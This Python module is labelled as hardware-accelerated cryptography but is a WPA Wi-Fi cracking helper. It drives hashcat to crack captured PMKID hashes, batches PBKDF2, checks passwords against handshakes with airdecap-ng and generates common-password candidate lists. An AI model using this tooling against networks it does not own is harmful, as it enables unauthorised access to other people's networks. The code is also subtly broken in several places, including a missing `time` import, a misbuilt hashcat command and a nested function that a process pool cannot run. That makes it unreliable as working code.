#!/usr/bin/env python3
"""
Hardware-accelerated cryptographic operations
"""

import subprocess
import hashlib
import os
import re
from typing import Optional, List
from concurrent.futures import ProcessPoolExecutor, ThreadPoolExecutor
import numpy as np


class CryptoAccelerator:
    """
    Hardware-accelerated crypto using GPU and SIMD
    """
    
    def __init__(self, gpu_enabled: bool = True):
        self.gpu_enabled = gpu_enabled and self._check_gpu()
        self.simd_enabled = self._check_simd()
        
    def _check_gpu(self) -> bool:
        """Check if GPU is available"""
        try:
            result = subprocess.run(
                ["hashcat", "-I"],
                capture_output=True, text=True
            )
            return "OpenCL" in result.stdout and "Device" in result.stdout
        except:
            return False
    
    def _check_simd(self) -> bool:
        """Check SIMD support"""
        try:
            import numpy as np
            # Test vectorized operations
            a = np.array([1, 2, 3, 4])
            b = a * 2
            return True
        except:
            return False
    
    @staticmethod
    def fast_pbkdf2(password: bytes, ssid: bytes, iterations: int = 4096) -> bytes:
        """
        Optimized PBKDF2 using vectorized operations
        """
        # Use hashlib's built-in PBKDF2 (C implementation, fast)
        return hashlib.pbkdf2_hmac('sha1', password, ssid, iterations, 32)
    
    @staticmethod
    def batch_pbkdf2(passwords: List[bytes], ssid: bytes, iterations: int = 4096) -> List[bytes]:
        """
        Batch PBKDF2 computation using multiple cores
        """
        def compute_one(password):
            return hashlib.pbkdf2_hmac('sha1', password, ssid, iterations, 32)
        
        with ProcessPoolExecutor(max_workers=4) as executor:
            results = list(executor.map(compute_one, passwords))
        return results
    
    def gpu_crack_pmkid(self, pmkid_hash: str, bssid: str, ssid: str, 
                        wordlist: Optional[str] = None) -> Optional[str]:
        """
        GPU-accelerated PMKID cracking using hashcat
        """
        if not self.gpu_enabled:
            return None
        
        try:
            hash_file = f"/tmp/pmkid_{int(os.getpid())}_{int(time.time())}.hash"
            with open(hash_file, 'w') as f:
                f.write(pmkid_hash)
            
            # Build hashcat command with optimal settings
            cmd = [
                "hashcat", "-m", "22000", hash_file,
                "--force",
                "-w", "4",      # High workload
                "-O",           # Optimized kernel
                "-a", "3",      # Mask attack first (fastest)
                "--self-test-disable",
                "--potfile-disable",
                "--stdout"
            ]
            
            # Add wordlist if provided
            if wordlist and os.path.exists(wordlist):
                cmd.insert(cmd.index("-a") + 1, "0")
                cmd.append(wordlist)
            else:
                # Default mask: common patterns
                cmd.append("?l?l?l?l?l?l?l?l?d?d?d?d?d?d?d?d")
            
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL
            )
            
            # Monitor output
            start_time = time.time()
            while time.time() - start_time < 15:
                line = proc.stdout.readline()
                if not line:
                    break
                line = line.decode().strip()
                
                # Check for found password
                if pmkid_hash in line:
                    parts = line.split(':')
                    if len(parts) >= 4:
                        password = parts[3]
                        proc.terminate()
                        os.unlink(hash_file)
                        return password
                
                time.sleep(0.05)
            
            proc.terminate()
            os.unlink(hash_file)
            
        except Exception as e:
            pass
        
        return None
    
    @staticmethod
    def compute_pmkid(pmk: bytes, bssid: bytes) -> bytes:
        """
        Compute PMKID from PMK and BSSID
        PMKID = HMAC-SHA1(PMK, "PMK Name" || BSSID)
        """
        from hashlib import sha1
        import hmac
        
        data = b"PMK Name" + bssid
        return hmac.new(pmk, data, sha1).digest()[:16]
    
    @staticmethod
    def fast_handshake_decrypt(handshake_file: str, password: str) -> bool:
        """
        Quickly test if password works on handshake
        """
        try:
            result = subprocess.run(
                ["airdecap-ng", "-p", password, "-e", "test", handshake_file],
                capture_output=True,
                timeout=5
            )
            return result.returncode == 0
        except:
            return False


class PasswordGenerator:
    """
    Fast password generation using vectorized operations
    """
    
    @staticmethod
    def generate_numeric(min_len: int = 8, max_len: int = 12) -> List[str]:
        """Generate numeric passwords"""
        # Use numpy for vectorized generation
        passwords = []
        
        # Common numeric patterns
        patterns = [
            "12345678", "87654321", "11111111", "00000000",
            "1234567890", "0987654321", "11223344", "12344321"
        ]
        passwords.extend(patterns)
        
        # Generate sequential patterns
        for start in range(0, 100, 10):
            passwords.append(f"{start:02d}" * 4)
            passwords.append(f"{start:03d}" * 3)
        
        return passwords
    
    @staticmethod
    def generate_date_based() -> List[str]:
        """Generate date-based passwords"""
        from datetime import datetime, timedelta
        
        passwords = []
        now = datetime.now()
        
        # Last 5 years in various formats
        for i in range(5):
            year = now.year - i
            passwords.extend([
                str(year),
                f"{year%100:02d}",
                f"{year}{year%100:02d}",
                f"{year}{year%100:02d}{year%100:02d}"
            ])
        
        return list(set(passwords))
    
    @staticmethod
    def generate_keyboard_patterns() -> List[str]:
        """Generate keyboard walking patterns"""
        patterns = [
            "qwerty", "qwertyuiop", "asdfgh", "zxcvbn",
            "qwerty123", "qwertyuiop123", "1qaz2wsx", "q1w2e3r4"
        ]
        return patterns
    
    @staticmethod
    def generate_all_patterns() -> List[str]:
        """Generate all common password patterns"""
        passwords = []
        passwords.extend(PasswordGenerator.generate_numeric())
        passwords.extend(PasswordGenerator.generate_date_based())
        passwords.extend(PasswordGenerator.generate_keyboard_patterns())
        
        # Remove duplicates
        return list(set(passwords))
